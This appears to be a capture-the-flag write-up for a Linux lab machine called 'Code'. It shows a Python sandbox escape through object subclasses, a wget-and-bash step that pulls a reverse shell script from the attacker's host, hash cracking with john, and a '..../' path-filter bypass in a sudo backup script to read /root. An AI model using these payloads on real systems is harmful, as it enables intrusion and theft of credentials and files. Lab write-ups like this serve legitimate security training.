# Code

```
Difficulty: Easy
Operating System: Linux
Hints: True
```



##  Summary

| Step | User / Access | Technique Used              | Result                                                                                            |
| :--- | :------------ | :-------------------------- | :------------------------------------------------------------------------------------------------ |
| 1    | `N/A`         | Port Scanning               | Found HTTP on port `5000`, SSH, and identified a Python Code Editor service.                      |
| 2    | `www-data`    | SSTI Injection              | Executed arbitrary Python code to get a reverse shell as `www-data`.                              |
| 3    | `martin`      | Database Credential Dumping | Extracted `martin`'s password hash from `database.db` and cracked it.                             |
| 4    | `martin`      | SSH Access                  | Logged in as `martin` using cracked password and obtained `user.txt`.                             |
| 5    | `root`        | Sudo Script Misuse          | Abused sudo permission on `/usr/bin/backy.sh` with crafted `task.json` to back up `/root` folder. |
| 6    | `root`        | Root Flag Retrieval         | Retrieved `root.txt` from `/tmp/root/` after the backup script ran.                               |

---


##  Nmap Scan

```bash
nmap code.htb -sV -A

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
```

---

## Initial Foothold: SSTI Injection

* A Python code editor web app was running on port `5000`.
* Discovered SSTI vulnerability allowing Python code injection.
* Bypassed keyword filters using creative string concatenation.

Example payload to list root directory:

```python
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()'))
```

* Downloaded a reverse shell script from attacker's machine and executed it:

```python
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("wget 10.10.xx.xx/shell.sh -O /tmp/shell.sh").read()'))
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("bash /tmp/shell.sh").read()'))
```

---

##  Privilege Escalation Part 1: User Enumeration & Credential Dumping

* Discovered a `database.db` file in `/app/instance/`.
* Extracted a password hash for user `martin`.

Used `john` to crack the password:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Recovered password for `martin`.

---

##  User Access: SSH Login

```bash
ssh martin@code.htb
```

* Found `user.txt` in `/home/martin/user.txt`.

---

## Privilege Escalation Part 2: Sudo Script Exploitation

* Checked sudo permissions:

```bash
sudo -l
```

Result showed `martin` can run `/usr/bin/backy.sh` as root without a password.

* Analyzed `backy.sh` script:

  * Takes a JSON file as argument.
  * Validates that directories are under `/home/` or `/var/`.
  * Uses `jq` to clean `../` from input but is vulnerable to double write (`/.../.../.../...`) bypass.

Crafted `task.json`:

```json
{
    "directories_to_archive": [
        "/home/..././root/"
    ],
    "destination": "/tmp"
}
```

Executed the backup script:

```bash
sudo /usr/bin/backy.sh task.json
```

---

##  Root Flag Retrieval

After the script ran, obtained `root.txt` from the backup in `/tmp`.

```bash
cat /tmp/root/root.txt
```

## 🔧 Mitigations

* Disable arbitrary code execution features.
* Validate input strictly.
* Avoid NOPASSWD in sudo unless required.
* Secure password storage and enforce strong password policies.

---

